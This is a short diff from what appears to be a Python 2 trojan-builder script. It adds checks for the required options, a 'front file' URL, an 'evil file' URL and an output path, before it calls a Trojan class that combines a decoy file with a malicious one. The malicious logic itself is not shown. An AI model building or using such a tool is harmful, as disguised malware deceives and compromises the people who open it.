@@ -14,8 +14,12 @@ parser.add_option('-z', '--zip', dest='zip', help='Zip trojan?', action="store_t
 
 (options, args) = parser.parse_args()
 
-print options
-
+if not options.front_file_url:
+	parser.error("Please specify front file, use --help argument for more info.")
+if not options.evil_file_url:
+	parser.error("Please specify evil file, use --help argument for more info.")
+if not options.out_file_path:
+	parser.error("Please specify out file, use --help argument for more info.")
 
 trojan = Trojan(options.front_file_url, options.evil_file_url, options.icon_path)
 trojan.create()
